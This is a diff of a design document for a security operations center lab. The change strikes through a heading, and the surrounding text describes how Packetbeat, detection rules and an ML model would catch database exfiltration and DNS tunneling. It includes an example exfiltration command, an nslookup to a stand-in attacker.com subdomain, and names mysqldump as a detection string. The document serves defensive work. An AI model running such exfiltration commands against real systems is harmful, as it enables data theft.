@@ -36,7 +36,7 @@ To demonstrate the versatility of the SOC (specifically its ability to monitor a
   2. **Data Exfiltration:** An attacker successfully connects and runs massive queries (e.g., `SELECT * FROM users;`).
 - **SOC Behavior:** Packetbeat natively parses MySQL/PostgreSQL wire protocols. The Detection Engine will use stateless rules to look for suspicious query strings (like `mysqldump`). The ML model will flag data exfiltration due to a massive, sudden spike in `avg_payload_size` (the DB response).
 
-### C. DNS Server (Covert Channels)
+### C. ~~DNS Server (Covert Channels)~~
 - **Service:** A simple `bind9` or `coredns` container exposed on port 53 (UDP).
 - **Attack:** **DNS Tunneling / Exfiltration** (encoding stolen data inside DNS queries, e.g., `nslookup secret-data-123.attacker.com`).
 - **SOC Behavior:** Packetbeat parses DNS requests. The Detection Engine will use stateless rules to flag unusually long DNS query strings. The ML model will flag the high `url_variance` (since every query contains unique exfiltrated data).
